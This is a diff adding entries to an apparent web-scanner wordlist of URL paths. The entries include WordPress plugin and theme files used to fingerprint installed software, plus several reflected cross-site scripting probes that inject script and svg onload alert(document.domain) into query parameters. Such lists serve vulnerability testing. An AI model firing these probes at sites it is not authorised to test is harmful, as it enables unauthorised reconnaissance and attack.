@@ -12545,3 +12545,15 @@ request?info=<svg onload=alert(
 /rest.html
 /geoserver/rest.html
 /wp-content/plugins/restrict-file-access/readme.txt
+/?portgw=80089948;%20alert(document.domain)
+/wp-content/plugins/cf7-editor-button/readme.txt
+/wp-content/plugins/css3_web_pricing_tables_grids/readme.txt
+/read.php?idName=1%3Cscript%3Ealert(document.domain)%3C/script%3E&mudi=getCityData
+/index.jsp
+/menu.jsp?flag=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+/help/systop.jsp?langcode=1%22%3E%3Csvg%20onload=alert(document.domain)%3E
+/help/systop.jsp?langcode=1%22%3E%3C/script%3E%3Csvg%20onload=alert(document.domain)%3E
+/wp-content/themes/fwdevp/style.css
+/wp-content/themes/listingeasy/style.css
+/wp-content/themes/electrician/style.css
+/wp-content/themes/invico/style.css
